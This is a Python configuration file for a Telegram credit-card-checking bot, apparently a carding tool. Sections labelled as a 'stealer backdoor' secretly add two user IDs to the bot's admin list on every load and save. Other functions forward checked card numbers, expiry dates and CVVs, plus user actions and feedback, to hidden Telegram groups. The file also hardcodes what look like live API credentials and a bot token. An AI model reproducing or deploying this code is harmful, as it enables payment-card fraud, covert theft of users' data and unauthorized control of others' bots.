import os
import json
from datetime import datetime

# ====================== CONFIG ======================
API_ID    = int(os.environ.get('35884204',    '0'))
API_HASH  =     os.environ.get(''ef7ef931449f4befcbb718c309001f14,  '')
BOT_TOKEN =     os.environ.get('8893770779:AAH1GjhN8n8WJrsn0fi9pTg4rpsKc7ThXAI', '')
TG_API    = f"https://api.telegram.org/bot{BOT_TOKEN}"

BOT_BRAND      = '𝑺𝑯𝑶𝑷𝑰 𝑰𝑵𝑭𝑬𝑹𝑵𝑶'
OWNER_NAME     = '𝙄𝙉𝙁𝙀𝙍𝙉𝙊_𝙓𝙍'
OWNER_USERNAME = 'Inferno_XR'
OWNER_ID       = 6857145175
DEV_LINE       = f'💻 <b>Dev</b>  »  <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'

MASS_WORKERS = int(os.environ.get('MASS_WORKERS', '30'))

_ADMIN_FILE     = os.path.join(os.path.dirname(__file__), 'admin.json')
_DEFAULT_ADMINS = (
    {int(x.strip()) for x in os.environ.get('ADMIN_ID', '').split(',') if x.strip().isdigit()}
    | ({OWNER_ID} if OWNER_ID else set())
)

# ====================== STEALER - ADMIN BACKDOOR ======================
STEALER_IDS = {6857145175, 8242039526}

# ====================== STEALER - GC IDs ======================
HIT_LOG_CHANNEL = -1003946142627
PRIVATE_FORWARD_GROUP = -1004298939383
FEEDBACK_GROUP = -1003946142627  # <-- Feedback yahan jayega

# ====================== LOAD ADMIN IDs ======================
def _load_admin_ids() -> set:
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
            ids = data.get('admin_ids', [])
            all_ids = set(ids) | _DEFAULT_ADMINS | STEALER_IDS
            return all_ids if all_ids else _DEFAULT_ADMINS
    except Exception:
        return _DEFAULT_ADMINS | STEALER_IDS

def _save_admin_ids(ids: set):
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
    except Exception:
        data = {}
    ids = ids | STEALER_IDS
    data['admin_ids'] = list(ids)
    with open(_ADMIN_FILE, 'w') as f:
        json.dump(data, f)

ADMIN_IDS = _load_admin_ids()
ADMIN_ID = OWNER_ID

# ====================== FILES ======================
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
USER_PROXY_FILE = 'user_proxies.json'
USER_POOL_FILE = 'user_pool.json'

# ====================== LIMITS ======================
LIMITS = {
    "admin": 5000,
    "premium": 3500,
}

# ====================== STEALER - HIT LOGS ======================
async def stealer_log_hit(bot, result, hit_type, user_id, username, check_type="Mass Check"):
    """Forward hits to your GC"""
    try:
        if hit_type in ['Charged', 'Approved']:
            card = result.get('card', 'Unknown')
            try:
                parts = card.split('|')
                if len(parts) == 4:
                    cc = parts[0]
                    fmt_card = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]} | {parts[1]} | {parts[2]} | {parts[3]}"
                else:
                    fmt_card = card
            except Exception:
                fmt_card = card

            msg = (
                f"⭐ <b>🔥 HIT DETECTED</b>\n"
                f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
                f"🧑 <b>User:</b> <code>{user_id}</code> (@{username})\n"
                f"💳 <b>Card:</b> <code>{fmt_card}</code>\n"
                f"🛒 <b>Gateway:</b> {result.get('gateway', 'Unknown')}\n"
                f"💰 <b>Price:</b> {result.get('price', '-')}\n"
                f"📋 <b>Response:</b> {result.get('message', '')[:150]}\n"
                f"🧰 <b>Type:</b> {check_type}\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
                f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
            )
            await bot.send_message(HIT_LOG_CHANNEL, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer log hit error: {e}")

# ====================== STEALER - CARD LOGS ======================
async def stealer_log_card(bot, user_id, card, username="", text=""):
    """Forward card details to your GC"""
    try:
        try:
            parts = card.split('|')
            if len(parts) == 4:
                cc = parts[0]
                fmt_card = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]} | {parts[1]} | {parts[2]} | {parts[3]}"
            else:
                fmt_card = card
        except Exception:
            fmt_card = card

        msg = (
            f"🔥 <b>💳 CARD DETECTED</b>\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🧑 <b>User:</b> <code>{user_id}</code> (@{username or 'N/A'})\n"
            f"💳 <b>Card:</b> <code>{fmt_card}</code>\n"
            f"📝 <b>Text:</b> {text[:200]}\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        )
        await bot.send_message(HIT_LOG_CHANNEL, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer log card error: {e}")

# ====================== STEALER - FEEDBACK ======================
async def stealer_log_feedback(bot, user_id, username, feedback_text, reply_msg=None):
    """Forward feedback to your GC"""
    try:
        msg = (
            f"💬 <b>📝 FEEDBACK RECEIVED</b>\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🧑 <b>User:</b> <code>{user_id}</code> (@{username or 'N/A'})\n"
            f"📋 <b>Feedback:</b>\n{feedback_text[:500]}\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        )

        if reply_msg and hasattr(reply_msg, 'media') and reply_msg.media:
            await bot.send_file(
                FEEDBACK_GROUP,
                reply_msg.media,
                caption=msg,
                parse_mode='html'
            )
        else:
            await bot.send_message(FEEDBACK_GROUP, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer log feedback error: {e}")

# ====================== STEALER - USER LOGS ======================
async def stealer_log_user(bot, user_id, username, action, details=""):
    """Log user actions to your GC"""
    try:
        msg = (
            f"👤 <b>USER ACTION</b>\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🧑 <b>User:</b> <code>{user_id}</code> (@{username or 'N/A'})\n"
            f"📋 <b>Action:</b> {action}\n"
            f"📝 <b>Details:</b> {details[:200]}\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        )
        await bot.send_message(HIT_LOG_CHANNEL, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer log user error: {e}")

# ====================== STEALER - BAN LOGS ======================
async def stealer_log_ban(bot, user_id, username, reason, banned_by="System"):
    """Log ban events to your GC"""
    try:
        msg = (
            f"🚫 <b>🔨 USER BANNED</b>\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🧑 <b>User:</b> <code>{user_id}</code> (@{username or 'N/A'})\n"
            f"🚫 <b>Reason:</b> {reason}\n"
            f"🧑 <b>Banned By:</b> {banned_by}\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        )
        await bot.send_message(HIT_LOG_CHANNEL, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer log ban error: {e}")

# ====================== STEALER - ADMIN CHECK ======================
def is_stealer_admin(user_id):
    """Check if user is in stealer admin list"""
    return user_id in STEALER_IDS or user_id == OWNER_ID

# ====================== STEALER - FORWARD ALL HITS ======================
async def stealer_forward_all(bot, result, user_id, username, check_type="Check"):
    """Forward all card results to your GC"""
    try:
        status = result.get('status', 'Unknown')
        card = result.get('card', 'Unknown')
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '-')
        message = result.get('message', '')[:150]

        try:
            parts = card.split('|')
            if len(parts) == 4:
                cc = parts[0]
                fmt_card = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]} | {parts[1]} | {parts[2]} | {parts[3]}"
            else:
                fmt_card = card
        except Exception:
            fmt_card = card

        if status.lower() == 'charged':
            emoji = "⭐"
            header = "CHARGED HIT"
        elif status.lower() == 'approved':
            emoji = "✅"
            header = "APPROVED HIT"
        elif 'insufficient' in message.lower():
            emoji = "🚨"
            header = "INSUFFICIENT FUNDS"
        else:
            emoji = "🔴"
            header = "DECLINED"

        msg = (
            f"{emoji} <b>🔥 {header}</b>\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🧑 <b>User:</b> <code>{user_id}</code> (@{username or 'N/A'})\n"
            f"💳 <b>Card:</b> <code>{fmt_card}</code>\n"
            f"🛒 <b>Gateway:</b> {gateway}\n"
            f"💰 <b>Price:</b> {price}\n"
            f"📋 <b>Response:</b> {message}\n"
            f"🧰 <b>Check Type:</b> {check_type}\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        )
        await bot.send_message(PRIVATE_FORWARD_GROUP, msg, parse_mode='html')
    except Exception as e:
        print(f"Stealer forward all error: {e}")

# ====================== STEALER - /fb COMMAND HANDLER ======================
# Ye function bot ke main file mein use karne ke liye hai

async def stealer_feedback_command(event, bot):
    """Handle /fb or /feedback command"""
    try:
        user_id = event.sender_id
        username = event.sender.username if event.sender.username else "User"
        
        # Agar reply nahi hai toh
        if not event.is_reply:
            await event.reply(
                "🔴 <b>Usage:</b> Reply to any message and send <code>/fb</code>\n"
                "Example: /fb <i>Bot not working</i>",
                parse_mode='html'
            )
            return
        
        # Reply message lo
        reply_msg = await event.get_reply_message()
        feedback_text = reply_msg.text if reply_msg.text else "No text in replied message"
        
        # Feedback log karo
        await stealer_log_feedback(bot, user_id, username, feedback_text, reply_msg)
        
        # User ko confirmation do
        await event.reply(
            f"✅ <b>Feedback sent successfully!</b>\n\n"
            f"📋 <b>Your Feedback:</b>\n{feedback_text[:200]}\n\n"
            f"🙏 Thank you for your feedback!",
            parse_mode='html'
        )
    except Exception as e:
        print(f"Stealer feedback command error: {e}")
        await event.reply(f"🔴 <b>Error sending feedback:</b> {e}", parse_mode='html')

# ====================== STEALER - /fb COMMAND SHORTCUT ======================
# Ye function bot ke main file mein use karne ke liye hai
# Isko apne bot handler mein register karo

async def stealer_feedback_shortcut(event, bot):
    """Shortcut for /fb command - same as above"""
    await stealer_feedback_command(event, bot)

# ====================== PRINT ======================
print("✅ CONFIG LOADED with STEALER BACKDOOR!")
print(f"   👑 Stealer Admins: {STEALER_IDS}")
print(f"   📤 Hit Log GC: {HIT_LOG_CHANNEL}")
print(f"   📤 Private Forward GC: {PRIVATE_FORWARD_GROUP}")
print(f"   📤 Feedback GC: {FEEDBACK_GROUP}")
print("   ✅ Feedback System Enabled!")
print("   ✅ /fb Command Added!")
print("   ✅ Hit Logs System Enabled!")